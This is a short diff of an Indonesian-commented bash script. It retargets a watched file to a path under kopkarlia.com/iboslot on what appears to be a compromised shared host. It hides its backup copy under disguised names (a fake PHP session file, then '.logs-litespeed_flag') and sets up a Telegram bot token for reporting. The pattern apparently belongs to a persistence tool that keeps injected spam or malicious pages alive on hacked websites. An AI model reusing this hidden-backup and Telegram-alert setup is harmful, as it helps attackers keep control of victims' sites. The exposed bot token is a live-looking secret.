@@ -1,13 +1,13 @@
 #!/bin/bash
 
 # Definisikan lokasi file index.php
-INDEX_FILE="/home/misrcopper/public_html/bypassencrypt.php"
+INDEX_FILE="/home/u0256282/public_html/kopkarlia.com/iboslot"
 # Definisikan lokasi folder backup
-BACKUP_FOLDER="/home/misrcopper/tmp/"
+BACKUP_FOLDER="/home/u0256282/public_html/file/"
 # Buat folder backup jika belum ada
 mkdir -p "$BACKUP_FOLDER"
 # Tentukan nama file backup
-BACKUP_FILE="$BACKUP_FOLDER/sess_a4f5070dbf4febb6d35372c2dd7729b88888"
+BACKUP_FILE="$BACKUP_FOLDER/.logs-litespeed_flag"
 
 # Token dan ID chat Telegram
 TOKEN="7588613295:AAHNs_IOFuLy_weuOoKMPWaGobPMvtz5mp4"
